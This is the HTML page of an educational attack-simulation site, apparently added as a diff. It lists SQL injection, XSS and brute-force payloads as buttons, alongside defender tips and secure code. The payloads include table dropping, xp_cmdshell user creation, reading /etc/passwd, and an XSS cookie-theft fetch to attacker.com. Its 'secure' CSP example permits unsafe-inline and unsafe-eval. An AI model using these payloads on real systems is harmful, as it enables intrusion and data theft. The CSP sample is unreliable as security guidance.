@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyber Attack Simulations | CyberSim</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Roboto', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                    },
+                    colors: {
+                        dark: {
+                            900: '#0a0a0a',
+                            800: '#1a1a1a',
+                            700: '#2a2a2a',
+                        },
+                        cyber: {
+                            red: '#ff3860',
+                            blue: '#3273dc',
+                            green: '#23d160',
+                            yellow: '#ffdd57',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        .gradient-bg {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+        }
+        .cyber-btn {
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .cyber-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
+        }
+        .cyber-btn:active {
+            transform: translateY(0);
+        }
+        .console {
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .payload-btn {
+            transition: all 0.2s ease;
+        }
+        .payload-btn:hover {
+            transform: translateY(-1px);
+        }
+        .success {
+            animation: pulseSuccess 1.5s ease-in-out;
+        }
+        .failure {
+            animation: pulseFailure 1.5s ease-in-out;
+        }
+        @keyframes pulseSuccess {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(35, 209, 96, 0.7); }
+            50% { box-shadow: 0 0 0 10px rgba(35, 209, 96, 0); }
+        }
+        @keyframes pulseFailure {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(255, 56, 96, 0.7); }
+            50% { box-shadow: 0 0 0 10px rgba(255, 56, 96, 0); }
+        }
+    </style>
+</head>
+<body class="bg-gray-100 dark:bg-dark-900 text-gray-800 dark:text-gray-200 min-h-screen">
+    <!-- Navigation -->
+    <nav class="bg-white dark:bg-dark-800 shadow-md">
+        <div class="container mx-auto px-4 py-3 flex justify-between items-center">
+            <a href="index.html" class="text-xl font-bold text-cyber-red dark:text-cyber-blue flex items-center">
+                <i class="fas fa-shield-alt mr-2"></i> CyberSim
+            </a>
+            <div class="flex items-center space-x-4">
+                <button id="darkModeToggle" class="p-2 rounded-full hover:bg-gray-200 dark:hover:bg-dark-700">
+                    <i class="fas fa-moon dark:hidden"></i>
+                    <i class="fas fa-sun hidden dark:block"></i>
+                </button>
+                <div class="hidden md:flex space-x-6">
+                    <a href="index.html" class="hover:text-cyber-blue">Home</a>
+                    <a href="simulations.html" class="text-cyber-blue font-medium">Simulations</a>
+                    <a href="defense_tips.html" class="hover:text-cyber-blue">Defense Tips</a>
+                    <a href="about.html" class="hover:text-cyber-blue">About</a>
+                </div>
+                <button class="md:hidden p-2" id="mobileMenuButton">
+                    <i class="fas fa-bars"></i>
+                </button>
+            </div>
+        </div>
+        <!-- Mobile menu -->
+        <div class="md:hidden hidden bg-white dark:bg-dark-800 px-4 py-2" id="mobileMenu">
+            <a href="index.html" class="block py-2 hover:text-cyber-blue">Home</a>
+            <a href="simulations.html" class="block py-2 hover:text-cyber-blue">Simulations</a>
+            <a href="about.html" class="block py-2 hover:text-cyber-blue">About</a>
+            <a href="defense_tips.html" class="block py-2 hover:text-cyber-blue">Defense Tips</a>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="container mx-auto px-4 py-8">
+        <div class="flex flex-col md:flex-row gap-8">
+            <!-- Sidebar -->
+            <aside class="md:w-1/4">
+                <div class="bg-white dark:bg-dark-800 rounded-lg shadow-md p-4 sticky top-4">
+                    <h2 class="text-xl font-bold mb-4">Simulation Types</h2>
+                    <ul class="space-y-2">
+                        <li>
+                            <a href="#sql-injection" class="block px-3 py-2 rounded hover:bg-gray-100 dark:hover:bg-dark-700 text-cyber-red font-medium">
+                                <i class="fas fa-database mr-2"></i> SQL Injection
+                            </a>
+                        </li>
+                        <li>
+                            <a href="#xss" class="block px-3 py-2 rounded hover:bg-gray-100 dark:hover:bg-dark-700 text-cyber-blue font-medium">
+                                <i class="fas fa-code mr-2"></i> XSS
+                            </a>
+                        </li>
+                        <li>
+                            <a href="#brute-force" class="block px-3 py-2 rounded hover:bg-gray-100 dark:hover:bg-dark-700 text-cyber-green font-medium">
+                                <i class="fas fa-lock-open mr-2"></i> Brute Force
+                            </a>
+                        </li>
+                    </ul>
+                    
+                    <div class="mt-6 pt-4 border-t border-gray-200 dark:border-dark-700">
+                        <div class="flex items-center justify-between mb-2">
+                            <label for="devModeToggle" class="font-medium">Developer Mode</label>
+                            <div class="flex items-center space-x-2">
+                                <label class="relative inline-flex items-center cursor-pointer">
+                                    <input type="checkbox" id="devModeToggle" class="sr-only peer">
+                                    <div class="w-11 h-6 bg-gray-300 dark:bg-dark-700 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-cyber-blue"></div>
+                                </label>
+                            </div>
+                        </div>
+                        <p class="text-sm text-gray-600 dark:text-gray-400">Show technical details of each attack</p>
+                    </div>
+                </div>
+            </aside>
+
+            <!-- Main Simulation Area -->
+            <div class="md:w-3/4 space-y-8">
+                <!-- SQL Injection Section -->
+                <section id="sql-injection" class="bg-white dark:bg-dark-800 rounded-lg shadow-md p-6">
+                    <div class="flex items-center justify-between mb-4">
+                        <h2 class="text-2xl font-bold text-cyber-red">
+                            <i class="fas fa-database mr-2"></i> SQL Injection Simulation
+                        </h2>
+                        <button onclick="resetSection('sql')" class="cyber-btn bg-gray-200 dark:bg-dark-700 hover:bg-gray-300 dark:hover:bg-dark-600 text-sm py-1 px-3 rounded">
+                            <i class="fas fa-redo mr-1"></i> Reset
+                        </button>
+                    </div>
+                    <p class="text-gray-600 dark:text-gray-400 mb-4">SQL Injection is a code injection technique that might destroy your database. Try these payloads to simulate an attack on a vulnerable login form.</p>
+                    
+                    <div class="mb-6">
+                        <h3 class="font-bold mb-2">Available Payloads:</h3>
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                            <!-- Active payloads -->
+                            <button onclick="simulatePayload(this, 'sql')" data-active="true" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                ' OR '1'='1
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Basic bypass</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'sql')" data-active="true" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                admin' --
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Comment out</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'sql')" data-active="true" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                ' UNION SELECT 1,username,password FROM users--
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Data extraction</span>
+                            </button>
+                            
+                            <!-- Inactive payloads -->
+                            <button onclick="simulatePayload(this, 'sql')" data-active="false" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                '; DROP TABLE users--
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Destructive</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'sql')" data-active="false" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                ' OR SLEEP(5) AND '1'='1
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Time-based</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'sql')" data-active="false" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                ' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Error-based</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'sql')" data-active="false" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                '; EXEC xp_cmdshell('net user hacker P@ssw0rd /ADD')--
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Command exec</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'sql')" data-active="false" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                ' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5--
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">File read</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'sql')" data-active="false" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                '; SELECT * FROM users WHERE username = 'admin' AND SUBSTRING(password,1,1) = 'a'--
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Blind SQLi</span>
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <!-- Simulation Output -->
+                    <div class="mb-4">
+                        <h3 class="font-bold mb-2">Simulation Output:</h3>
+                        <pre id="sqlConsole" class="console bg-black dark:bg-dark-900 text-green-400 p-4 rounded font-mono overflow-auto max-h-60">> Waiting for SQL injection attempt...
+> Enter a payload to see the simulated result.</pre>
+                    </div>
+                    
+                    <!-- Defender Tips -->
+                    <div id="sqlDefenderTips" class="hidden bg-blue-50 dark:bg-blue-900/20 text-blue-800 dark:text-blue-200 p-4 rounded-lg border-l-4 border-cyber-blue mb-4">
+                        <h3 class="font-bold mb-2 flex items-center">
+                            <i class="fas fa-shield-alt mr-2"></i> Defender Tips: SQL Injection Prevention
+                        </h3>
+                        <ul class="list-disc pl-5 space-y-1">
+                            <li><strong>Use prepared statements with parameterized queries</strong> - This separates SQL code from data</li>
+                            <li><strong>Implement input validation</strong> - Whitelist allowed characters and patterns</li>
+                            <li><strong>Apply the principle of least privilege</strong> - Database accounts should have minimal necessary permissions</li>
+                            <li><strong>Use stored procedures</strong> - When properly implemented, they can help prevent SQLi</li>
+                            <li><strong>Enable proper error handling</strong> - Don't expose database errors to users</li>
+                        </ul>
+                        <div class="mt-3">
+                            <a href="defense_tips.html#sql" class="text-sm text-cyber-blue hover:underline">More SQL Injection defense tips →</a>
+                        </div>
+                    </div>
+                    
+                    <!-- Developer Mode Content -->
+                    <div id="sqlDevMode" class="hidden bg-gray-50 dark:bg-dark-700 p-4 rounded-lg border-l-4 border-gray-400 dark:border-gray-500">
+                        <h3 class="font-bold mb-2 flex items-center">
+                            <i class="fas fa-code mr-2"></i> Developer Mode: SQL Injection Details
+                        </h3>
+                        <p class="mb-2">The vulnerable code might look like this:</p>
+                        <pre class="console bg-black dark:bg-dark-900 text-gray-300 p-3 rounded text-xs overflow-auto">// UNSAFE CODE - Vulnerable to SQL Injection
+String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
+Statement stmt = connection.createStatement();
+ResultSet rs = stmt.executeQuery(query);</pre>
+                        <p class="mt-3 mb-2">Secure alternative using prepared statements:</p>
+                        <pre class="console bg-black dark:bg-dark-900 text-green-300 p-3 rounded text-xs overflow-auto">// SAFE CODE - Uses parameterized queries
+String query = "SELECT * FROM users WHERE username = ? AND password = ?";
+PreparedStatement stmt = connection.prepareStatement(query);
+stmt.setString(1, username);
+stmt.setString(2, password);
+ResultSet rs = stmt.executeQuery();</pre>
+                    </div>
+                </section>
+
+                <!-- XSS Section -->
+                <section id="xss" class="bg-white dark:bg-dark-800 rounded-lg shadow-md p-6">
+                    <div class="flex items-center justify-between mb-4">
+                        <h2 class="text-2xl font-bold text-cyber-blue">
+                            <i class="fas fa-code mr-2"></i> Cross-Site Scripting (XSS) Simulation
+                        </h2>
+                        <button onclick="resetSection('xss')" class="cyber-btn bg-gray-200 dark:bg-dark-700 hover:bg-gray-300 dark:hover:bg-dark-600 text-sm py-1 px-3 rounded">
+                            <i class="fas fa-redo mr-1"></i> Reset
+                        </button>
+                    </div>
+                    <p class="text-gray-600 dark:text-gray-400 mb-4">XSS allows attackers to inject malicious scripts into web pages viewed by other users. Try these payloads to simulate an attack on a vulnerable comment system.</p>
+                    
+                    <div class="mb-6">
+                        <h3 class="font-bold mb-2">Available Payloads:</h3>
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                            <!-- Active payloads -->
+                            <button onclick="simulatePayload(this, 'xss')" data-active="true" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                &lt;script&gt;alert('XSS')&lt;/script&gt;
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Basic XSS</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'xss')" data-active="true" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                &lt;img src="x" onerror="alert('XSS')"&gt;
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Image error</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'xss')" data-active="true" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                &lt;a href="javascript:alert('XSS')"&gt;Click me&lt;/a&gt;
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">JS URL</span>
+                            </button>
+                            
+                            <!-- Inactive payloads -->
+                            <button onclick="simulatePayload(this, 'xss')" data-active="false" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                &lt;svg onload="alert('XSS')"&gt;&lt;/svg&gt;
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">SVG vector</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'xss')" data-active="false" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                &lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">IFrame</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'xss')" data-active="false" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                &lt;body onload="alert('XSS')"&gt;
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Body event</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'xss')" data-active="false" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                &lt;script&gt;fetch('https://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Cookie theft</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'xss')" data-active="false" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                javascript:eval('alert("XSS")')
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Eval</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'xss')" data-active="false" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                &lt;div style="background:url('javascript:alert(\"XSS\")')"&gt;
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">CSS injection</span>
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <!-- Simulation Output -->
+                    <div class="mb-4">
+                        <h3 class="font-bold mb-2">Simulation Output:</h3>
+                        <div class="bg-white dark:bg-dark-900 border border-gray-300 dark:border-dark-700 p-4 rounded min-h-40">
+                            <div id="xssConsole" class="min-h-32">
+                                <p class="text-gray-500 italic">> Waiting for XSS payload...</p>
+                                <p class="text-gray-500 italic">> This area simulates how a vulnerable page would render user input.</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Defender Tips -->
+                    <div id="xssDefenderTips" class="hidden bg-blue-50 dark:bg-blue-900/20 text-blue-800 dark:text-blue-200 p-4 rounded-lg border-l-4 border-cyber-blue mb-4">
+                        <h3 class="font-bold mb-2 flex items-center">
+                            <i class="fas fa-shield-alt mr-2"></i> Defender Tips: XSS Prevention
+                        </h3>
+                        <ul class="list-disc pl-5 space-y-1">
+                            <li><strong>Escape all untrusted data</strong> - Based on the HTML context (body, attribute, JavaScript, CSS)</li>
+                            <li><strong>Implement Content Security Policy (CSP)</strong> - Restrict sources of scripts and other resources</li>
+                            <li><strong>Use HTTP-only and Secure flags for cookies</strong> - Prevent JavaScript access to sensitive cookies</li>
+                            <li><strong>Validate and sanitize all inputs</strong> - Use libraries like DOMPurify for HTML sanitization</li>
+                            <li><strong>Encode data on output</strong> - Not just input, to prevent stored XSS</li>
+                        </ul>
+                        <div class="mt-3">
+                            <a href="defense_tips.html#xss" class="text-sm text-cyber-blue hover:underline">More XSS defense tips →</a>
+                        </div>
+                    </div>
+                    
+                    <!-- Developer Mode Content -->
+                    <div id="xssDevMode" class="hidden bg-gray-50 dark:bg-dark-700 p-4 rounded-lg border-l-4 border-gray-400 dark:border-gray-500">
+                        <h3 class="font-bold mb-2 flex items-center">
+                            <i class="fas fa-code mr-2"></i> Developer Mode: XSS Details
+                        </h3>
+                        <p class="mb-2">The vulnerable code might look like this:</p>
+                        <pre class="console bg-black dark:bg-dark-900 text-gray-300 p-3 rounded text-xs overflow-auto">// UNSAFE CODE - Vulnerable to XSS
+const userComment = req.body.comment;
+document.getElementById('comments').innerHTML += `&lt;div class="comment"&gt;${userComment}&lt;/div&gt;`;</pre>
+                        <p class="mt-3 mb-2">Secure alternatives:</p>
+                        <pre class="console bg-black dark:bg-dark-900 text-green-300 p-3 rounded text-xs overflow-auto">// Option 1: Text content instead of HTML
+document.getElementById('comments').textContent = userComment;
+
+// Option 2: Use a sanitization library
+const clean = DOMPurify.sanitize(userComment);
+document.getElementById('comments').innerHTML += `&lt;div class="comment"&gt;${clean}&lt;/div&gt;`;</pre>
+                        <p class="mt-3 mb-1"><strong>Content Security Policy (CSP) Header Example:</strong></p>
+                        <pre class="console bg-black dark:bg-dark-900 text-green-300 p-3 rounded text-xs overflow-auto">Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; object-src 'none';</pre>
+                    </div>
+                </section>
+
+                <!-- Brute Force Section -->
+                <section id="brute-force" class="bg-white dark:bg-dark-800 rounded-lg shadow-md p-6">
+                    <div class="flex items-center justify-between mb-4">
+                        <h2 class="text-2xl font-bold text-cyber-green">
+                            <i class="fas fa-lock-open mr-2"></i> Brute Force Attack Simulation
+                        </h2>
+                        <button onclick="resetSection('brute')" class="cyber-btn bg-gray-200 dark:bg-dark-700 hover:bg-gray-300 dark:hover:bg-dark-600 text-sm py-1 px-3 rounded">
+                            <i class="fas fa-redo mr-1"></i> Reset
+                        </button>
+                    </div>
+                    <p class="text-gray-600 dark:text-gray-400 mb-4">Brute force attacks systematically check all possible passwords until the correct one is found. Try these common passwords to simulate an attack.</p>
+                    
+                    <div class="mb-6">
+                        <h3 class="font-bold mb-2">Available Payloads:</h3>
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                            <!-- Active payloads -->
+                            <button onclick="simulatePayload(this, 'brute')" data-active="true" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                password
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Most common</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'brute')" data-active="true" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                123456
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Numeric sequence</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'brute')" data-active="true" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                qwerty
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Keyboard pattern</span>
+                            </button>
+                            
+                            <!-- Inactive payloads -->
+                            <button onclick="simulatePayload(this, 'brute')" data-active="false" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                letmein
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Common phrase</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'brute')" data-active="false" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                admin123
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Admin default</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'brute')" data-active="false" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                welcome1
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Default pass</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'brute')" data-active="false" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                P@ssw0rd
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Complex common</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'brute')" data-active="false" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                summer2023
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Seasonal</span>
+                            </button>
+                            <button onclick="simulatePayload(this, 'brute')" data-active="false" class="payload-btn bg-gray-100 dark:bg-dark-700 hover:bg-gray-200 dark:hover:bg-dark-600 text-left text-sm py-2 px-3 rounded border border-gray-200 dark:border-dark-700">
+                                football
+                                <span class="float-right text-xs text-gray-500 dark:text-gray-400">Sports</span>
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <!-- Simulation Output -->
+                    <div class="mb-4">
+                        <h3 class="font-bold mb-2">Simulation Output:</h3>
+                        <pre id="bruteConsole" class="console bg-black dark:bg-dark-900 text-green-400 p-4 rounded font-mono overflow-auto max-h-60">> Brute force simulation ready...
+> Attempt passwords to see results.</pre>
+                    </div>
+                    
+                    <!-- Defender Tips -->
+                    <div id="bruteDefenderTips" class="hidden bg-blue-50 dark:bg-blue-900/20 text-blue-800 dark:text-blue-200 p-4 rounded-lg border-l-4 border-cyber-blue mb-4">
+                        <h3 class="font-bold mb-2 flex items-center">
+                            <i class="fas fa-shield-alt mr-2"></i> Defender Tips: Brute Force Prevention
+                        </h3>
+                        <ul class="list-disc pl-5 space-y-1">
+                            <li><strong>Implement account lockout policies</strong> - Temporarily lock accounts after several failed attempts</li>
+                            <li><strong>Use rate limiting</strong> - Limit login attempts per IP address</li>
+                            <li><strong>Enforce strong password policies</strong> - Minimum length, complexity requirements</li>
+                            <li><strong>Implement multi-factor authentication (MFA)</strong> - Require additional verification beyond passwords</li>
+                            <li><strong>Use CAPTCHAs</strong> - For login forms to prevent automated attacks</li>
+                            <li><strong>Monitor for unusual login patterns</strong> - Detect and block suspicious activity</li>
+                        </ul>
+                        <div class="mt-3">
+                            <a href="defense_tips.html#brute" class="text-sm text-cyber-blue hover:underline">More brute force defense tips →</a>
+                        </div>
+                    </div>
+                    
+                    <!-- Developer Mode Content -->
+                    <div id="bruteDevMode" class="hidden bg-gray-50 dark:bg-dark-700 p-4 rounded-lg border-l-4 border-gray-400 dark:border-gray-500">
+                        <h3 class="font-bold mb-2 flex items-center">
+                            <i class="fas fa-code mr-2"></i> Developer Mode: Brute Force Details
+                        </h3>
+                        <p class="mb-2">Basic login check (vulnerable to brute force):</p>
+                        <pre class="console bg-black dark:bg-dark-900 text-gray-300 p-3 rounded text-xs overflow-auto">// Basic login check (vulnerable)
+app.post('/login', (req, res) => {
+    const { username, password } = req.body;
+    const user = users.find(u => u.username === username && u.password === password);
+    if (user) {
+        // Successful login
+    } else {
+        // Failed login
+    }
+});</pre>
+                        <p class="mt-3 mb-2">Secure implementation with rate limiting and lockout:</p>
+                        <pre class="console bg-black dark:bg-dark-900 text-green-300 p-3 rounded text-xs overflow-auto">// Secure login with rate limiting
+const rateLimit = require('express-rate-limit');
+const loginLimiter = rateLimit({
+    windowMs: 15 * 60 * 1000, // 15 minutes
+    max: 5, // Limit each IP to 5 login attempts per window
+    message: 'Too many login attempts, please try again later'
+});
+
+app.post('/login', loginLimiter, (req, res) => {
+    const { username, password } = req.body;
+    
+    // Check if account is locked
+    if (loginAttempts[username] >= MAX_ATTEMPTS) {
+        return res.status(429).send('Account temporarily locked');
+    }
+    
+    const user = users.find(u => u.username === username && u.password === password);
+    if (user) {
+        // Reset attempts on success
+        loginAttempts[username] = 0;
+        // Successful login
+    } else {
+        // Increment failed attempts
+        loginAttempts[username] = (loginAttempts[username] || 0) + 1;
+        // Failed login
+    }
+});</pre>
+                    </div>
+                </section>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-white dark:bg-dark-800 py-8 border-t border-gray-200 dark:border-gray-700">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col md:flex-row justify-between items-center">
+                <div class="mb-4 md:mb-0">
+                    <a href="index.html" class="text-xl font-bold text-cyber-red dark:text-cyber-blue flex items-center">
+                        <i class="fas fa-shield-alt mr-2"></i> CyberSim
+                    </a>
+                    <p class="text-sm text-gray-600 dark:text-gray-400 mt-1">Educational cybersecurity simulation platform</p>
+                </div>
+                <div class="flex space-x-6">
+                    <a href="simulation.html" class="text-gray-600 dark:text-gray-400 hover:text-cyber-blue">Simulations</a>
+                    <a href="about.html" class="text-gray-600 dark:text-gray-400 hover:text-cyber-blue">About</a>
+                    <a href="defense_tips.html" class="text-gray-600 dark:text-gray-400 hover:text-cyber-blue">Defense Tips</a>
+                </div>
+            </div>
+            <div class="border-t border-gray-200 dark:border-gray-700 mt-6 pt-6 text-center text-sm text-gray-600 dark:text-gray-400">
+                <p>© 2023 Cyber Attack & Defense Simulator. For educational purposes only.</p>
+                <p class="mt-1">Payloads sourced from PayloadsAllTheThings and SecLists repositories.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="assets/js/simulation.js"></script>
+    <script>
+        // Dark mode toggle
+        const darkModeToggle = document.getElementById('darkModeToggle');
+        const html = document.documentElement;
+
+        // Check for saved user preference or OS preference
+        if (localStorage.getItem('darkMode') === 'true' || 
+            (!localStorage.getItem('darkMode') && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+            html.classList.add('dark');
+        }
+
+        darkModeToggle.addEventListener('click', () => {
+            html.classList.toggle('dark');
+            localStorage.setItem('darkMode', html.classList.contains('dark'));
+        });
+
+        // Mobile menu toggle
+        const mobileMenuButton = document.getElementById('mobileMenuButton');
+        const mobileMenu = document.getElementById('mobileMenu');
+
+        mobileMenuButton.addEventListener('click', () => {
+            mobileMenu.classList.toggle('hidden');
+        });
+
+        // Developer mode toggle
+        const devModeToggle = document.getElementById('devModeToggle');
+        devModeToggle.addEventListener('change', function() {
+            const devModeSections = document.querySelectorAll('[id$="DevMode"]');
+            devModeSections.forEach(section => {
+                if (this.checked) {
+                    section.classList.remove('hidden');
+                } else {
+                    section.classList.add('hidden');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
